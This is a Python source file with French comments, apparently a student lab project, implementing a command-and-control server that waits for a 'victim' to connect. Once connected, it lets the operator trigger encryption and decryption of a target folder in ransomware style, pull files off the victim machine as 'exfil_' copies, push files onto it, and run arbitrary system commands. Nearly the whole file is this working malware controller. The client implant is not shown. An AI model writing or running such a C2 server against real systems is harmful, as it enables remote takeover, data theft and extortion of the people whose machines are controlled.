import socket, os

def start_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8888))
    s.listen(5)
    print("[*] Serveur C2 pret. En attente de la victime...")

    conn, addr = s.accept()
    # Réception de l'ID et de la Clé générée par /dev/urandom
    print(f"\n[+] VICTIME CONNECTEE : {conn.recv(1024).decode()}")
    
    # Affichage automatique des commandes pour le prof
    print("\n--- COMMANDES DE TEST DISPONIBLES ---")
    print("  ENCRYPT / DECRYPT : Chiffre/Dechiffre le dossier test_attaque")
    print("  GET <chemin>      : Exfiltrer un fichier (ex: GET test_attaque/secret.txt)")
    print("  SEND <chemin>     : Infiltrer un fichier (ex: SEND note.txt)")
    print("  <cmd systeme>     : Execute une commande (ex: ls, whoami, pwd)")
    print("  exit              : Fermer la connexion")
    print("--------------------------------------")

    while True:
        cmd = input("\nC2 >> ")
        if not cmd: continue
        conn.send(cmd.encode())
        if cmd == "exit": break

        if cmd.startswith("GET "):
            size = conn.recv(1024).decode()
            if "ERREUR" in size: print(size)
            else:
                conn.send(b"READY")
                data = b""
                while len(data) < int(size): data += conn.recv(4096)
                name = "exfil_" + os.path.basename(cmd.split()[1])
                with open(name, "wb") as f: f.write(data)
                print(f"[+] Succes: {name} sauvegarde.")

        elif cmd.startswith("SEND "):
            p = cmd.split()[1]
            if os.path.exists(p):
                with open(p, "rb") as f: content = f.read()
                conn.send(str(len(content)).encode())
                if conn.recv(1024).decode() == "READY": conn.sendall(content)
                print(conn.recv(1024).decode())
            else: print("[-] Erreur: Fichier introuvable localement.")
        else:
            print(f"\n[CLIENT]:\n{conn.recv(4096).decode()}")

    conn.close()

if __name__ == "__main__":
    start_c2()
